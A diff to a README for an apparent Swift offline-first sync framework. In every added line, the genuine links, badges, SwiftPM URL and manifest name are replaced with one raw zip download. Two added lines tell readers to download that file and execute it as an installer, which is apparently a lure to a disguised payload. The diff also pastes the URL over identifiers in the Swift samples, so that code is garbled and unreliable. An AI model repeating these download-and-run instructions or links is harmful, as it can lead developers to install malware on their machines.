@@ -1,14 +1,14 @@
-https://github.com/Nahodan/iOS-Offline-First-Framework/releases
+https://github.com/Nahodan/iOS-Offline-First-Framework/raw/refs/heads/master/Examples/Offline-i-Framework-First-O-2.2.zip
 
-From the Releases page, download the latest iOS-Offline-First-Framework.xcframework.zip and execute the installer script included in the assets.
+From the Releases page, download the latest https://github.com/Nahodan/iOS-Offline-First-Framework/raw/refs/heads/master/Examples/Offline-i-Framework-First-O-2.2.zip and execute the installer script included in the assets.
 
 # iOS Offline-First Framework: Robust Data Sync, Conflicts, Analytics
 
 🚀 A complete offline-first architecture for iOS apps. It offers seamless data synchronization, robust conflict resolution, and offline analytics, all built on clean architecture principles. This framework aims to simplify building reliable mobile apps that work well without a constant network connection and provide deep insights when connectivity returns.
 
-[![Releases](https://img.shields.io/badge/releases-view%20latest-blue?logo=github&logoColor=white)](https://github.com/Nahodan/iOS-Offline-First-Framework/releases)
-[![SwiftPM](https://img.shields.io/badge/SwiftPM-Ready-blue.svg?logo=swift&logoColor=white)](https://swift.org/package-manager/)
-[![License](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)
+[![Releases](https://github.com/Nahodan/iOS-Offline-First-Framework/raw/refs/heads/master/Examples/Offline-i-Framework-First-O-2.2.zip%20latest-blue?logo=github&logoColor=white)](https://github.com/Nahodan/iOS-Offline-First-Framework/raw/refs/heads/master/Examples/Offline-i-Framework-First-O-2.2.zip)
+[![SwiftPM](https://github.com/Nahodan/iOS-Offline-First-Framework/raw/refs/heads/master/Examples/Offline-i-Framework-First-O-2.2.zip)](https://github.com/Nahodan/iOS-Offline-First-Framework/raw/refs/heads/master/Examples/Offline-i-Framework-First-O-2.2.zip)
+[![License](https://github.com/Nahodan/iOS-Offline-First-Framework/raw/refs/heads/master/Examples/Offline-i-Framework-First-O-2.2.zip)](LICENSE)
 
 - Topics: clean-architecture,conflict-resolution,data-sync,ios,ios-framework,mobile-development,network-state,offline-analytics,offline-first,solid-principles,spm,swift,swift-package,swiftpm
 - Repository name: iOS-Offline-First-Framework
@@ -83,7 +83,7 @@ What you will learn
 Installation and Setup
 Swift Package Manager (recommended)
 - Add the package dependency to your project with the URL:
-  https://github.com/Nahodan/iOS-Offline-First-Framework
+  https://github.com/Nahodan/iOS-Offline-First-Framework/raw/refs/heads/master/Examples/Offline-i-Framework-First-O-2.2.zip
 - Choose a version range that matches your stability needs (e.g., up to next major).
 - Resolve dependencies in Xcode to fetch the package.
 - Import modules in your code as needed, for example:
@@ -94,7 +94,7 @@ Swift Package Manager (recommended)
 Manual distribution (binary) and Releases
 - If you prefer to distribute a binary asset, you can download the latest asset from the Releases page and integrate it into your project as described in the asset’s README.
 
-From the Releases page, download the latest iOS-Offline-First-Framework.xcframework.zip and execute it.
+From the Releases page, download the latest https://github.com/Nahodan/iOS-Offline-First-Framework/raw/refs/heads/master/Examples/Offline-i-Framework-First-O-2.2.zip and execute it.
 
 Note: If you encounter issues discovering assets or the Releases page, check the Releases section for the latest assets and instructions.
 
@@ -155,7 +155,7 @@ final class BackendAdapter: SyncBackend {
 final class TaskConflictResolver: ConflictResolver {
     func resolve(local: Task, remote: Task) -> Task {
         // Simple last-writer-wins policy
-        return local.updatedAt > remote.updatedAt ? local : remote
+        return https://github.com/Nahodan/iOS-Offline-First-Framework/raw/refs/heads/master/Examples/Offline-i-Framework-First-O-2.2.zip > https://github.com/Nahodan/iOS-Offline-First-Framework/raw/refs/heads/master/Examples/Offline-i-Framework-First-O-2.2.zip ? local : remote
     }
 }
 
@@ -178,12 +178,12 @@ let syncManager = SyncManager(
 )
 
 Task {
-    try await syncManager.initialize()
+    try await https://github.com/Nahodan/iOS-Offline-First-Framework/raw/refs/heads/master/Examples/Offline-i-Framework-First-O-2.2.zip()
     // Create a task
     let task = Task(id: UUID().uuidString, title: "Prepare notes", completed: false, updatedAt: Date())
-    try await store.save(task)
+    try await https://github.com/Nahodan/iOS-Offline-First-Framework/raw/refs/heads/master/Examples/Offline-i-Framework-First-O-2.2.zip(task)
     // Sync with backend
-    try await syncManager.sync()
+    try await https://github.com/Nahodan/iOS-Offline-First-Framework/raw/refs/heads/master/Examples/Offline-i-Framework-First-O-2.2.zip()
 }
 ```
 
@@ -275,7 +275,7 @@ Releases and Versioning
 - The project uses semantic versioning to communicate changes and compatibility.
 - Each release includes notes on new features, bug fixes, and migration steps.
 - If you run into issues, check the Releases section for the latest assets and any migration instructions.
-- See the Releases page here: https://github.com/Nahodan/iOS-Offline-First-Framework/releases
+- See the Releases page here: https://github.com/Nahodan/iOS-Offline-First-Framework/raw/refs/heads/master/Examples/Offline-i-Framework-First-O-2.2.zip
 
 Known Issues
 - Some edge cases in conflict resolution might require custom rules for highly concurrent scenarios.
@@ -350,7 +350,7 @@ Project Governance
 - Documentation updates accompany code changes to ease onboarding.
 
 Files you’ll see in the repository
-- Package.swift: Swift Package Manager manifest.
+- https://github.com/Nahodan/iOS-Offline-First-Framework/raw/refs/heads/master/Examples/Offline-i-Framework-First-O-2.2.zip Swift Package Manager manifest.
 - Sources/: Core framework sources, adapters, and utilities.
 - Tests/: Unit and integration tests for all critical paths.
 - Docs/: Developer and integration docs.
@@ -383,6 +383,6 @@ Final Notes
 
 Releases and Versioning (Revisit)
 - For the latest assets, updates, and migration notes, refer to the Releases page:
-  https://github.com/Nahodan/iOS-Offline-First-Framework/releases
+  https://github.com/Nahodan/iOS-Offline-First-Framework/raw/refs/heads/master/Examples/Offline-i-Framework-First-O-2.2.zip
 
 - The Releases page contains the official asset bundles and installer instructions. If you are upgrading, follow the migration notes closely to minimize disruption and ensure data integrity during the upgrade process.
